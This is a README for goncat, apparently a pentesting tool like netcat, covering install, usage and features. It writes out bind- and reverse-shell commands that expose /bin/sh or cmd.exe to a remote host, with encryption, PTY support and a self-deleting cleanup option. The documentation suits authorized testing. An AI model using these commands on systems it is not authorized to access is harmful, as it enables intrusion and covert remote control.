# goncat

goncat is a netcat-like tool you can use to create bind or reverse shells.
It contains a few extra features that I missed from netcat.
First, goncat supports encryption with mutual authentication
so you don't have to write on one page of your pentest report that administrative access to servers without encryption or authentication is a problem
while writing on the next page how you did exactly that.
Second, it can create log files of your sessions so you can later see and show exactly what you did.
Third, it has cross-platform PTY support for your convenience.
Finally, it can clean up after itself so you don't leave your binaries behind when you are done.

## Install

You can run `go install github.com/local/goncat` to install goncat to the `bin` folder in your GOPATH, usually `~/go/bin`.
Alternatively, download the pre-built binary for your system and architecture.
Download are available in the [release section](TODO).

## Getting started

Akin to netcat, goncat allows to bind a socket or can be used to connect to one.
There is only one binary combining all features and it works cross-platform.
For example, you can do the following things:
- Raw data transfers: `goncat listen --port 12345` to listen on port 12345,
  then from somewhere else `goncat connect --host 11.22.33.44 --port 12345` to connect. 
  Whatever you type on one end of the connection will be sent to the other.
- Bind/reverse shells: `goncat listen --exec /bin/sh --port 12345` to expose a shell on port 12345,
  then on the other side `goncat connect --host 11.22.33.44 --port 12345`
- Shells with encryption, PTY support and logging: `goncat listen --port 12345 --ssl --key secret --pty --log /tmp/session.log` to start a listener on port 12345,
  which logs the session to a file.
  Then on the remote side run `goncat.exe connect --host 11.22.33.44 --port 12345 --exec cmd.exe --ssl --key secret --pty`
  to get a fully interactive reverse shell, encrypted and authenticated with your password `secret`.

## Features

goncat provides two commands.
With `goncat listen` you launch a server that listens on a `--port` and optionally on a specific IP
specified with `--host` (default is any).
`goncat connect` launches a client which connects to a `--host` and `--port`.
By default goncat attaches to your stdin and stdout but you can pass `--exec` on either side
to launch an executable and attach to that.
Think of all this as the same you would usually do with `nc`, `ncat` and the like.

In addition to these basic features, there is:
- Encryption: you can add `--ssl` on both ends to ensure all traffic is encrypted.
- Authentication: on top of `--ssl` you can add `--key mypassword` on both ends.
  This way they both generate RSA keys derived from the shared password used for mutual TLS authentication.
- Logging: use `--log` to make goncat log all traffic sent over the wire to a local log file.
  For example, you can use that to document everything you did through a reverse shell.
- PTY support: add `--pty` on both ends to enable pseudoterminal support.
  Only makes sense if you expose shells with `--exec`.
  Works on Linux, Windows and MacOS.
  goncat handles all the details automatically, so there is no need for `stty raw -echo` or row and column size adjustments.
  It also restores your terminal when the connection terminates.
- Cleanup: you can pass `--cleanup` to make goncat delete itself on process termination.
  This works well on UNIX systems but Windows is tricky.
  Currently goncat launches a cmd-based cleanup job that runs 5 seconds after it terminated
  and marks the file for deletion on the next reboot just in case that job fails.
